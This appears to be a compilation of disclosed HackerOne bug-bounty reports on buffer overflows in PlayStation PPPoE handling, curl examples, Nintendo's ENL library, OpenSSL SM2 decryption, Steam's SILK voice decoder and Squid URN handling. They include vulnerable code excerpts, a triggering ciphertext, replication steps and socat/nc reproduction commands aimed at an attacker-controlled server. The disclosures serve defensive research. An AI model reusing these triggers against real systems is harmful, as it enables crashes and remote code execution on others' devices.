4. Overwrite the return address: After the buffer is filled, overwrite the return address with a controlled value, such as the address of a function that spawns a shell (e.g., `system("/bin/sh")`).
   
5. Execute the exploit: The program will return to the overwritten address, which should point to the shell-spawning function. If successful, the attacker will gain control of the system and can execute arbitrary commands.
   
6. Confirm the impact: If the exploit works as intended, the program will execute the shell, giving the attacker control over the system.

## Impact

Thid bug can allow attackers to overwrite the return address on the stack, enabling them to execute arbitrary code or gain control of the system. By exploiting this vulnerability, attackers can redirect the program’s execution to a location of their choice, typically resulting in remote code execution or the execution of malicious commands, such as spawning a shell. This can lead to full system compromise, privilege escalation (if the program runs with elevated privileges), unauthorized access to sensitive data, manipulation of data, or even the complete takeover of the system. Additionally, if the buffer overflow leads to a program crash, it may result in a denial of service (DoS).

---

### [Remote vulnerabilities in spp](https://hackerone.com/reports/2177925)

- **Report ID:** `2177925`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 12500 usd
- **Disclosed:** 2024-04-25T21:49:25.943Z
- **CVE(s):** CVE-2006-4304

**Summary (team):**

## Summary
A malicious PPPoE server can cause denial-of-service or potentially remote code execution in kernel context on the PS4/PS5.

## Heap buffer overwrite and overread in sppp_lcp_RCR and sppp_ipcp_RCR

For some reason, the PS4/PS5 is vulnerable to [CVE-2006-4304](https://www.freebsd.org/security/advisories/FreeBSD-SA-06:18.ppp.asc). By having invalid options, it is possible to cause a heap buffer overwrite and overread.

```c
static int
sppp_ipcp_RCR(struct sppp *sp, struct lcp_header *h, int len)
{
	u_char *buf, *r, *p;
	struct ifnet *ifp = &sp->pp_if;
	int rlen, origlen, debug = ifp->if_flags & IFF_DEBUG;
	u_int32_t hisaddr, desiredaddr;

	len -= 4;
	origlen = len;
	// ...
	buf = r = malloc ((len < 6? 6: len), M_TEMP, M_NOWAIT);
	if (! buf)
		return (0);
	// ...
	p = (void *)(h + 1);
	for (rlen=0; len>1 && p[1]; len-=p[1], p+=p[1]) { // [1]
		if (debug)
			addlog(" %s", sppp_ipcp_opt_name(*p));
		switch (*p) {
        // ...
		default:
			/* Others not supported. */
			if (debug)
				addlog(" [rej]");
			break;
		}
		/* Add the option to rejected list. */
		bcopy (p, r, p[1]); // [2]
		r += p[1];
		rlen += p[1]; // [3]
	}
	if (rlen) {
		if (debug)
			addlog(" send conf-rej\n");
		sppp_cp_send(sp, PPP_IPCP, CONF_REJ, h->ident, rlen, buf); // [4]
		goto end;
	} else if (debug)
		addlog("\n");

	// ...
}
```

Namely, at [1] the length of `p[1]` is not validated to be smaller or equal to `len`. As such, at [2] the call `bcopy()` will copy with a size potentially larger than both the source and the destination.

Furthermore, at [3] the return length is incremented by the malicious length. Hence, the data that is overread from the `mbuf` is copied into `buf` (with overflow) and returned to the malicious PPPoE server with `sppp_cp_send()`.

For example this is some data that got sent back containing pointers:

```c
00000000  54 ab 3a 9a ab ad 00 d9  d1 bc 83 e4 88 64 11 00  |T.:..........d..|
00000010  00 14 00 90 80 21 04 02  00 8e 2a ff 41 41 41 41  |.....!....*.AAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 00 00 00 00  |AAAAAAAAAAAA....|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 38 00 2b c5  |............8.+.|
00000040  72 9a cf 01 03 00 08 00  38 61 07 eb bd ff ff bd  |r.......8a......|
00000050  ff ff bd ff ff d9 d1 bc  83 e4 29 00 00 00 b4 07  |..........).....|
00000060  00 00 03 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000a0  00 00 00 00                                       |....            |
000000a4
```

Regarding exploitability of the overwrite, note that the allocation size for `malloc()` can be influenced via the LCP header:

```c
static void
sppp_cp_input(const struct cp *cp, struct sppp *sp, struct mbuf *m)
{
	// ...
	struct lcp_header *h;
	// ...
	h = mtod(m, struct lcp_header *);
	// ...
	if (len > ntohs(h->len))
		len = ntohs(h->len);
	p = (u_char *)(h + 1);
	switch (h->type) {
	case CONF_REQ:
		// ...
		rv = (cp->RCR)(sp, h, len);
		// ...
	}
}
```

By doing so, it is possible to trigger a copy from a bigger `mbuf` to a smaller `buf`, thus allowing to overwrite adjacent allocations with controllable data.

See attachment for a proof-of-concept that leaks data and can eventually panic the device.

## Integer underflow in sppp_pap_input leading to heap-buffer overread

```c
void
sppp_pap_input(struct sppp *sp, struct mbuf *m)
{
	// ...
	int len, x;
	// ...
	int name_len, passwd_len;
	// ...
	h = mtod (m, struct lcp_header*);
	if (len > ntohs (h->len))
		len = ntohs (h->len); // [1]
	switch (h->type) {
	/* PAP request is my authproto */
	case PAP_REQ:
		name = 1 + (u_char*)(h+1);
		name_len = name[-1];
		passwd = name + name_len + 1;
		if (name_len > len - 6 || // [2]
		    (passwd_len = passwd[-1]) > len - 6 - name_len) {
			if (debug) {
				log(LOG_DEBUG, SPP_FMT "pap corrupted input "
				    "<%s id=0x%x len=%d",
				    SPP_ARGS(ifp),
				    sppp_auth_type_name(PPP_PAP, h->type),
				    h->ident, ntohs(h->len));
				if (len > 4)
					sppp_print_bytes((u_char*)(h+1), len-4);
				addlog(">\n");
			}
			break;
		}
		// ...
		if (name_len > AUTHMAXLEN ||
		    passwd_len > AUTHMAXLEN ||
		    bcmp(name, sp->hisauth.name, name_len) != 0 ||
		    bcmp(passwd, sp->hisauth.secret, passwd_len) != 0) {
			/* action scn, tld */
			mlen = sizeof(FAILMSG) - 1;
			sppp_auth_send(&pap, sp, PAP_NAK, h->ident,
				       sizeof mlen, (const char *)&mlen,
				       sizeof(FAILMSG) - 1, (u_char *)FAILMSG,
				       0);
			pap.tld(sp);
			break;
		}
		// ...
		if (name_len == sp->hisauth.name_len &&
		    memcmp(name, sp->hisauth.name, name_len) == 0 && // [3]
		    secret_len == sp->hisauth.secret_len &&
		    memcmp(secret, sp->hisauth.secret, secret_len) == 0) {
			sp->scp[IDX_PAP].rcr_type = CP_RCR_ACK;
		} else {
			sp->scp[IDX_PAP].rcr_type = CP_RCR_NAK;
		}
	// ...
	}
}
```

At [1], it is possible to set `len` to a length between 0 and 5. Thus, at [2] `len - 6` can have a negative length between -6 and -1. As such, the checks for `name_len` and `passwd_len` can be bypassed, and it is possible to have lengths up to 255 bytes. As a consequence, at [3] it is possible to read out-of-bounds from the `mbuf` when comparing the name and password with `memcmp()`. Since different responses are returned back based on the comparison, an attacker might be able to use this as a an oracle to leak the out-of-bounds data (by setting the name and secret beforehand). This could be used to leak pointers and defeat KASLR remotely.

Note that this vulnerability is still affecting NetBSD and OpenBSD. FreeBSD seemed to have deprecated this whole protocol.

## Impact

A malicious PPPoE server can cause denial-of-service or potentially remote code execution in kernel context on the PS4/PS5.

---

### [Buffer overflow and affected url:-https://github.com/curl/curl/blob/master/docs/examples/hsts-preload.c](https://hackerone.com/reports/2252307)

- **Report ID:** `2252307`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @cyberguardianrd
- **Bounty:** - usd
- **Disclosed:** 2023-11-15T10:10:19.471Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A buffer overflow, also known as a buffer overrun, occurs when a program or process attempts to write more data to a buffer than the buffer is allocated to hold. This can happen if the program does not properly check the length of the data before writing it to the buffer, or if the program allocates too little space for the buffer.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1. The hstsread function in the provided code does not properly check the length of the host string before copying it into the e->name buffer. This could lead to a buffer overflow, allowing an attacker to inject arbitrary code into the application.this could exploited by a malicious domain or website whose url should be long enough to overflow buffer as it's using strcpy function 
Condition a malicious preload host is required to exploit this if it's meet government can use it for zero click attack

Recommendation:

The hstsread function should be modified to check the length of the host string before copying it into the e->name buffer. If the string is too long, the function should return an error code

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

Affected url:-https://github.com/curl/curl/blob/master/docs/examples/hsts-preload.c
Here is the vulnerable code if attacker or government manipulate developer to add a very long domain name in  hsts_preload then this will result remote code execution 



#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

struct entry {
  const char *name;
  const char *exp;
};

static const struct entry preload_hosts[] = {
  { "example.com", "20370320 01:02:03" },
  { "curl.se",     "20370320 03:02:01" },
  { NULL, NULL } /* end of list marker */
};

struct state {
  int index;
};

/* "read" is from the point of the library, it wants data from us. One domain
   entry per invoke. */
static CURLSTScode hstsread(CURL *easy, struct curl_hstsentry *e,
                            void *userp)
{
  const char *host;
  const char *expire;
  struct state *s = (struct state *)userp;
  (void)easy;
  host = preload_hosts[s->index].name;
  expire = preload_hosts[s->index++].exp;

  if(host && (strlen(host) < e->namelen)) {
    strcpy(e->name, host);
    e->includeSubDomains = 0;
    strcpy(e->expire, expire);
    fprintf(stderr, "HSTS preload '%s' until '%s'\n", host, expire);
  }
  else
    return CURLSTS_DONE;
  return CURLSTS_OK;
}

static CURLSTScode hstswrite(CURL *easy, struct curl_hstsentry *e,
                             struct curl_index *i, void *userp)
{
  (void)easy;
  (void)userp; /* we have no custom input */
  printf("[%u/%u] %s %s\n", (unsigned int)i->index, (unsigned int)i->total,
         e->name, e->expire);
  return CURLSTS_OK;
}

int main(void)
{
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if(curl) {
    struct state st = {0};

    /* enable HSTS for this handle */
    curl_easy_setopt(curl, CURLOPT_HSTS_CTRL, (long)CURLHSTS_ENABLE);

    /* function to call at first to populate the cache before the transfer */
    curl_easy_setopt(curl, CURLOPT_HSTSREADFUNCTION, hstsread);
    curl_easy_setopt(curl, CURLOPT_HSTSREADDATA, &st);

    /* function to call after transfer to store the new state of the HSTS
       cache */
    curl_easy_setopt(curl, CURLOPT_HSTSWRITEFUNCTION, hstswrite);
    curl_easy_setopt(curl, CURLOPT_HSTSWRITEDATA, NULL);

    /* use the domain with HTTP but due to the preload, it should do the
       transfer using HTTPS */
    curl_easy_setopt(curl, CURLOPT_URL, "http://curl.se");

    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  return 0;
}

## Impact

An attacker could exploit this vulnerability to inject arbitrary code into the application. This could allow the attacker to take control of the application and perform actions on behalf of the user.

---

### [[WiiU/Switch] Remote code execution inside the ENL library](https://hackerone.com/reports/1541273)

- **Report ID:** `1541273`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Nintendo
- **Reporter:** @crazy_man123
- **Bounty:** - usd
- **Disclosed:** 2023-08-11T03:34:46.574Z
- **CVE(s):** -

**Summary (team):**

-

**Summary (researcher):**

# Introduction

**The vulnerability is fixed on all of the impacted games, the last fix was released for Splatoon 1 and Mario Kart 8 on August 3, 2023**

Nintendo uses its own private library called ENL, it can do matchmaking using NEX (networking library for Nintendo game servers) and communication between players is done using PIA (UDP peer-to-peer networking library) 

This library is used in many Nintendo games including:

- Mario Kart 8 / Mario Kart 8 Deluxe
- Splatoon 1 / 2 / 3
- Animal Crossing: New Horizons
- Super Mario Maker 2
- Nintendo Switch Sports

---
&nbsp;

# How ENL works

- ENL only sends packet through a Unreliable Protocol (PIA can also do reliable UDP transmission)
- Games can register "content transporters" to ENL, each content transporter have a unique ID
- Each content transporter implements its own data format

A packet can contain one or more ENL messages and each message has the following format:

| Type | Description |
| -------- | ------- |
| uint8 | Content transporter ID |
| uint16 | Data length |
| bytes | Data  |

There's an **End marker** marking the end of a packet:

| Type | Description | Value |
| -------- | ------- | ------- |
| uint8 | Content transporter ID | 255 |
| uint16 | Data length | 0 |

---
&nbsp;

# The vulnerability

- All of the data received and sent is handled by the **TransportManager** (i won't display any reverse engineered pseudo-code because the summary would be too long), but the logic didn't check the data or its size. (But you can expect a link to a more in-depth explanation to be added here in the future)

- A "buffer" refers to a ``enl::Buffer``, an object with a data pointer, a size and a capacity, the content is changed using ``enl::Buffer::set(data, size)``, a simple memcpy() and it updates the "size" field

- Prior to the fixes, this method **did not check the size was less or equal to the capacity**.

Here's two of the main issues of the receive logic:

- The received data could be bigger than the global receive buffer (0x442 bytes)
- The received data could be bigger than the content transporter receive buffers (2 per player, size defined per content transporter)

In this last case, it triggers an heap overflow (to your assigned enl::Buffer, let's call it **PlayerBuffer**).

And ~~thankfully~~ the data right after each of the receive buffers is a pointer to a enl::Buffer (let's call it **MagicBuffer**), so if you could guess the address or overwrite the bottom bytes of this pointer (Switch is Little Endian, and WiiU has no ASLR :P), you could redirect it to controlled data, and craft a enl::Buffer entry.

Additional logic would then trigger a copy of the data from the **PlayerBuffer** to the **MagicBuffer** (so, to an address you control), so if for example it's a stack address, you can do ROP, thus making it a **Remote Code Execution** vulnerability

**NOTE:** Remote Code Execution was only demonstrated to Nintendo for Mario Kart 8 on the Wii U

---
&nbsp;

# Impact

- Remote code execution and/or denial of service, chained with other vulnerabilities, a malicious actor could gain full access to the device

{F2591101}

---

### [Use of Unsafe function || Strcpy](https://hackerone.com/reports/1485379)

- **Report ID:** `1485379`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @shobhit2401200
- **Bounty:** - usd
- **Disclosed:** 2022-03-09T21:48:14.205Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
It was observed that application is using strcpy() function which may cause buffer overflow attacks.

#Affected Code
https://github.com/curl/curl

# Affected Lines
1. Line 195 of curl-master\tests\libtest\stub_gssapi.c
2. Line 204,212,216 curl-master\tests\server\socksd.c

## Steps To Reproduce:
Lets first discuss what is the issue with strcpy function. basically it takes 2 arguments 1 dst 2 source. the issue is if the dst size is small and the source size is more without a null terminating value so it will overwrite the memory. so in these case 1 got the several lines about strcpy function. but i'm discussing 1 with you rest with remain the same.

        else if(!strcmp(key, "backend")) {
          strcpy(config.addr, value);

        else if(!strcmp(key, "password")) {
          strcpy(config.password, value);

  char addr[32]; /* backend IPv4 numerical */
  char user[256];
  char password[256];

here it is copying the value into config.addr and the size of addr is 32 and same goes for password is  256. now let suppose the value of value is more than 32 in case of add and in case of password it is more than 256. than it can be buffer overflow attack here. so here it will be secure if you use the functions like snprintf , strlcpy. or dynamically assign the size to the array.

## Supporting Material/References:
https://cwe.mitre.org/data/definitions/676.html
https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/

# Recommendation:
It is recommended to use below mentioned functions to avoid buffer overflow attacks
1. snprintf
2. strlcpy

  * [attachment / reference]
Please find the attached screenshots for your reference.

## Impact

The strcpy() function does not specify the size of the destination array, so buffer overrun is often a risk. Using strcpy() function to copy a large character array into a smaller one is dangerous, but if the string will fit, then it will not be worth the risk. If the destination string is not large enough to store the source string then the behavior of strcpy() is unspecified or undefined.

---

### [CVE-2021-3711: SM2 decrypt  buffer overflow ](https://hackerone.com/reports/1352429)

- **Report ID:** `1352429`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @ouyang
- **Bounty:** 2000 usd
- **Disclosed:** 2021-09-27T18:19:33.623Z
- **CVE(s):** CVE-2021-3711

**Vulnerability Information:**

CVE-2021-3711
In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the "out" parameter can be NULL and, on exit, the "outlen" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the "out" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. 


Reproduce step:

Examples of data that triggered the vulnerability
1. SM2 ciphertext data
Examples of ciphertext data are as follows:

3072022070DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6021F18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D04200B772E4DB664B2601E3B85E39E4DB664B2601E3B85E39C4AA308BE13588C301308E3588C01308E3588E3308E4

2. Parse SM2 ciphertext
The length of this ciphertext is 116 bytes. Parse this group of ciphertexts according to the ASN.1 format:

3072 //30 indicates the SEQUENCE type, 72 indicates that the total length of the subsequent data is 114 bytes

0220 //02 means INTEGER type, 20 means the length of the integer is 32 bytes

70DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6 //32-byte XCoordinate

021F //02 means INTEGER type, 1F means the length of the integer is 31 bytes

18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D //31-byte YCoordinate

0420 //04 means OCTETSTRING type, 20 means the length of the string is 32 bytes

0B772E4DB664B2601E3B85E39C4AA8C2C1910308BE13B331E009C5A9258C29FD //32-byte HASH

040B //04 means OCTETSTRING type, 0B means the length of the string is 11 bytes

6D588BE9260A94DA18E0E6 //11-byte ciphertext

After verification, the above-mentioned XCoordinate and YCoordinate satisfy the SM2 elliptic curve equation.

3. Trigger heap overflow
When pkey_sm2_decrypt is called for the first time, the pointer out is NULL and msg_len is equal to 116. The sm2_plaintext_size function returns 10 (msg_len-overhead = 116-106).

10 bytes of memory are allocated through OPENSSL_malloc, and out points to this memory.

The second call to pkey_sm2_decrypt, since the ciphertext has 11 bytes, the decryption result is also 11 bytes.

The memory pointed to by out is 10 bytes, and the decrypted result is 11 bytes, resulting in 1 byte being written out of bounds.

## Impact

A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. 

OpenSSL versions 1.1.1k and below are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1l.

OpenSSL 1.0.2 is not impacted by this issue.

OpenSSL 3.0 alpha/beta releases are also affected but this issue will be addressed before the final release.

**Summary (team):**

OpenSSL Advisory: https://www.openssl.org/news/secadv/20210824.txt

---

### [Buffer overrun in Steam SILK voice decoder](https://hackerone.com/reports/1180252)

- **Report ID:** `1180252`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @slidybat
- **Bounty:** 7500 usd
- **Disclosed:** 2021-09-13T17:56:19.395Z
- **CVE(s):** -

**Vulnerability Information:**

#Vulnerability
The SteamWorks SDK has a function available named [DecompressVoice()](https://partner.steamgames.com/doc/api/ISteamUser#DecompressVoice), which takes as input some compressed voice data, and returns the raw audio data.

The format for the input voice data is as follows:
```
8 bytes - steamid
1 byte - payload type
2 bytes - payload size
<payload data>
4 bytes - CRC checksum
```

There are numerous payload types available, including Opus PLC, Opus, SILK, Raw and Silence. The bug being considered here is specific to the SILK decoder.

The pseudo-code for the SILK decoder is:
```cpp
unsigned int VoiceEncoder_SILK::Decode( const char* pPayloadData, size_t nPayloadSize, char* pDestBuffer, size_t nDestBufferSize )
{
	m_decControl.API_sampleRate = m_nSampleRate;
	int nSamplesInFrame = 20 * m_nSampleRate / 1000;
	int nBytesInFrame = 2 * nSamplesInFrame;
	
	const char* pPayloadCurr = pPayloadData;
	const char* pPayloadEnd = pPayloadData + pPayloadSize;
	
	char* pDestCurr = pDestBuffer;
	char* pDestEnd = pDestBuffer + nDestBufferSize;
	
	while ( pPayloadCurr < pPayloadEnd )
	{
		unsigned short nSize = *(short*)pPayloadCurr;
		pPayloadCurr += 2;
		if ( nSize == 0xFFFF )
		{
			return ( pDestCurr - pDestBuffer ) / 2;
		}
		
		if ( nSize )
		{
			//  [1] Make sure we're not reading past end of our input
			if ( pPayloadCurr + nSize > pPayloadEnd )
				break;
			
			//  [2] Make sure we have enough room in output for a full frame
			if ( pDestCurr + 2 * nBytesInFrame > pDestEnd )
				break;
			
			// Zero out the frame
			memset( pDestCurr, 0, nBytesInFrame );
			
			do
			{
				unsigned short nDecodedSamples = ( pDestCurr - pDestBuffer ) / 2;
				SKP_Silk_SDK_Decode( m_pDecoder, &m_decControl, 0, pPayloadCurr, nSize, pDestCurr, &nDecodedSamples );
				
				pPayloadCurr += nSize;
				pDestCurr += 2 * nDecodedSamples;
				
				Assert( m_decControl.moreInternalDecoderFrames == 0 ); // [3] We shouldn't get this condition in normal contexts
			}
			while ( m_decControl.moreInternalDecoderFrames );
		}
		else
		{
			pDestCurr += nBytesInFrame;
		}
	}
	
	return ( pDestCurr - pDestBuffer ) / 2;
}
```

Some important things to note:
 - At `[1]`, a bounds check is performed to ensure we don't read outside the bounds of the input buffer
 - At `[2]`, a bounds check is performed to ensure we don't write outside the bounds of the output buffer
 - At `[3]`, an assert is performed that `m_decControl.moreInternalDecoderFrames == 0`, however, without running with a debugger attached, this assertion is ignored.

The bug has to do with the do/while loop with `m_decControl.moreInternalDecoderFrames`. Inside the loop, `pPayloadCurr` and `pDestCurr` are both incremented, but the bounds checks at `[1]` and `[2]` aren't repeated.

This means that if `m_decControl.moreInternalDecoderFrames` is true, then we can increment `pDestCurr` past the end of the destination buffer, and overwrite stack data.

#Exploiting the vulnerability
For the PoC, I chose to show this bug working in CS:GO, but any service that also uses the DecompressVoice function is also vulnerable. We can use this bug to crash Steam/CS:GO for any players on the server that our voices are transmitted to.

Note that the PoC simply overwrites the stack with garbage data which leads to a crash, however it is entirely possible for an attacker to overwrite the return pointer on the stack with meaningful data that results in RCE. Doing so requires quite a lot of setup work with the payload to get SILK to decode it to a valid ROP chain, so I simply went with the crash for an easier PoC.

One of the challenges to getting this working is to keep the payload size small. CS:GO has a rate-limit on voice data, so the entire voice packet must be kept under 512 bytes.

To accomplish this, we can build a voice payload that does this:
 -  First, set `nSize` in the payload to 0 multiple times to get `pDestCurr` closer to `pDestEnd` (just over 1 frame away).
 - Next, trigger a call to `SKP_Silk_SDK_Decode` that also sets `m_decControl.moreInternalDecoderFrames` to true. At this point, `pDestCurr` will be incremented by 1 frame, and there will now be less than 1 frame of room in the dest buffer.
 - Trigger another call to `SKP_Silk_SDK_Decode`. Since `m_decControl.moreInternalDecoderFrames` is true, no bounds check is performed. This time there isn't enough room for a frame in the dest buffer and the decode function will overwrite the stack past `pDestBuffer`.

Attached is a compiled version of a public cheat ([CSGOSimple](https://github.com/spirthack/CSGOSimple)) that adds a console command (`send_voice_packet`) to send the voice payloads from a file to the server.

A file that implements this payload is attached as `voice_payload`, which can be fed to the `send_voice_packet` command to replicate the PoC.
*NOTE*: Unrelated for replicating the PoC, but this payload is missing the SteamID/CRC data mentioned above. It is expected to be passed into `CP2PVoiceSingleton::DecompressVoice()` directly, or have the SteamID/CRC added before calling it.

#Replication steps
1) Start CS:GO on device A with `-insecure` launch param and join a server (any empty vanilla server will do, I have one at `s1.slidyb.at` if needed).
2) Extract CSGOSimple.zip from the attachments onto device A and run `injector.exe`. Ensure that it has injected into the CS:GO process successfully by checking if the `send_voice_packet` command exists.
3) Start CS:GO on device B and join the same server.
4) Run `send_voice_packet path\to\voice_payload` in the CS:GO console on device A, where `path\to\voice_payload` is the absolute path to the `voice_payload` file without the `C:`. For example, if the file as at `C:\Users\me\Desktop\voice_payload`, then you would use the command `send_voice_packet Users\me\Desktop\voice_payload`.
5) Steam and CS:GO should both crash on device B.

## Impact

This bug affects any service using the SteamWorks DecompressVoice function, which includes Steam itself and most Source engine titles. It can be used on any other client that can hear voice data from the attacker, including on official Valve matchmaking servers in Source games.

In the best case, it is possible for an attacker to utilize the bug as a DoS to crash other clients, and in the worst case it can lead to RCE by using ROP.

---

### [UrnState Heap Overflow](https://hackerone.com/reports/824771)

- **Report ID:** `824771`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jeriko_one
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:36:06.987Z
- **CVE(s):** CVE-2019-12526

**Vulnerability Information:**

## Summary:
When handling a URN Request an attacker controlled response can  cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an attacker to overflow adjacent memory, but also control a pointer that follows the buffer enabling them to free arbitrary memory. Paired with the Cache Manager bypass that I reported earlier, an attacker will know which addresses are valid. This can lead to RCE and was stated in the serverity of the Squid announce. 

Squid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_7.txt
Assigned CVE-2019-12526

## Steps To Reproduce:
You must add the following to your squid.conf to allow URN request

```
acl Safe_ports port 0
```

The squid child will crash even without Asan, but it'll automatically restart. You can check PIDs to confirm it did crash or you can build with ASan if you want to see the crash output. 

```
$ export CFLAGS="${CFLAGS} -fsanitize=address -g"
$ export CXXFLAGS="${CXXFLAGS} ${CFLAGS}"

$./configure
```

I would also set the following ASan flags
```
export ASAN_OPTIONS="detect_leaks=false abort_on_error=true"
```


1) Start Squid
```
./sbin/squid --foreground -d 100
```

1) Start a server that will output 4096 bytes
```
$ socat TCP-LISTEN:8080,fork SYSTEM:"python -c \'print\(\\\"A\\\" * 4096)\'"
```

2) Make a URN request to this server
```
$ echo -e "GET urn::@<attacker IP>:8080/ HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

```

```
=================================================================
==4723==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000067958 at pc 0x7f0d8a44deed bp 0x7ffff8eef4b0 sp 0x7ffff8eeec58
WRITE of size 81 at 0x621000067958 thread T0
    #0 0x7f0d8a44deec  (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec)
    #1 0x563906dc1389 in mem_hdr::copyAvailable(mem_node*, long, unsigned long, char*) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:202
    #2 0x563906dc1f58 in mem_hdr::copy(StoreIOBuffer const&) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:262
    #3 0x563906de76d7 in store_client::scheduleMemRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:424
    #4 0x563906de6f0c in store_client::scheduleRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:391
    #5 0x563906de691f in store_client::doCopy(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:352
    #6 0x563906de6082 in storeClientCopy2 /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:306
    #7 0x563906de4ac4 in storeClientCopyEvent /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:145
    #8 0x563906c3cc8e in EventDialer::dial(AsyncCall&) /home/j1/h4x/squid/releases/squid-4.8/src/event.cc:41
    #9 0x563906c3d7c6 in AsyncCallT<EventDialer>::fire() ../src/base/AsyncCall.h:145
    #10 0x563906fd75cd in AsyncCall::make() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCall.cc:40
    #11 0x563906fd90b5 in AsyncCallQueue::fireNext() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:56
    #12 0x563906fd8bfc in AsyncCallQueue::fire() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:42
    #13 0x563906c3e8ac in EventLoop::dispatchCalls() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:144
    #14 0x563906c3e42e in EventLoop::runOnce() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:109
    #15 0x563906c3e052 in EventLoop::run() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:83
    #16 0x563906d35a0e in SquidMain(int, char**) /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1709
    #17 0x563906d34102 in SquidMainSafe /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1417
    #18 0x563906d3404f in main /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1405
    #19 0x7f0d89723eaa in __libc_start_main (/lib64/libc.so.6+0x23eaa)
    #20 0x563906ae3b59 in _start (/home/j1/h4x/squid/debug/squid-4.8/sbin/squid+0x484b59)

0x621000067958 is located 0 bytes to the right of 4184-byte region [0x621000066900,0x621000067958)
allocated by thread T0 here:
    #0 0x7f0d8a4c59ae in __interceptor_calloc (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x1179ae)
    #1 0x563907343217 in xcalloc /home/j1/h4x/squid/releases/squid-4.8/compat/xalloc.cc:83
    #2 0x56390731d954 in MemPoolMalloc::allocate() /home/j1/h4x/squid/releases/squid-4.8/src/mem/PoolMalloc.cc:35
    #3 0x563907317412 in MemImplementingAllocator::alloc() /home/j1/h4x/squid/releases/squid-4.8/src/mem/Pool.cc:204
    #4 0x563906b62af5 in cbdataInternalAlloc(int, char const*, int) /home/j1/h4x/squid/releases/squid-4.8/src/cbdata.cc:238
    #5 0x563906e36d1c in UrnState::operator new(unsigned long) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:32
    #6 0x563906e344c1 in urnStart(HttpRequest*, StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:211
    #7 0x563906c609cb in FwdState::Start(RefCount<Comm::Connection> const&, StoreEntry*, HttpRequest*, RefCount<AccessLogEntry> const&) /home/j1/h4x/squid/releases/squid-4.8/src/FwdState.cc:373
    #8 0x563906bac622 in clientReplyContext::processMiss() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:783
    #9 0x563906bb947e in clientReplyContext::doGetMoreData() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1855
    #10 0x563906bb76d1 in clientReplyContext::identifyFoundObject(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1707
    #11 0x563906bae43c in clientReplyContext::created(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:937
